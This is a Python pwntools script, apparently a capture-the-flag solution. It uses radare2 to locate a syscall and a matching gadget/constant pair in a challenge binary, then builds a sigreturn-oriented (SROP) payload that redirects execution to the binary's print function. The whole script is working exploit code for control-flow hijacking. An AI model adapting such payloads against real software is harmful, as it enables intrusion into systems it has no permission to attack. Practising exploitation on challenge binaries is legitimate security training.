#!/usr/bin/env python3

from pwn import *
import r2pipe

exe = context.binary = ELF('elf')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

p = start()

targetrax = 1337

r = r2pipe.open(exe.path)
r.cmd('aaa')
syscall = r.cmdj('pdfj @ sym.vuln')['ops'][-4]['offset']
gadgets = r.cmdj('pdj 480 @ sym.gadgets + 0xc')
gadgets = [gadgets[i:i+3] for i in range(0, len(gadgets), 3)]

# print(gadgets)

constants_raw = r.cmdj('p8j 320 @ obj.constants')
constants = [constants_raw[i] + constants_raw[i+1] * 0x100 for i in range(0, len(constants_raw), 2)]

print(constants)

for i in range(len(gadgets)):
    if gadgets[i][1]['opcode'] == "sub ax, word [rbx]" and constants[i] < 0x2000 - 0x200 and constants[i] > 0x200:
        constant = constants[i]
        gadget = gadgets[i]
        break

print(gadget)
print(constant)

frame = SigreturnFrame()
frame.rax = targetrax
frame.rip = exe.sym['print']
frame.rsp = exe.address + 0x4600

payload = flat({
    0x8: [
        gadget[0]['offset'],
        syscall,
        frame,
        ],
    }, length=constant + 0xf)

print(hex(len(payload)))


pause()
p.send(payload)

p.interactive()
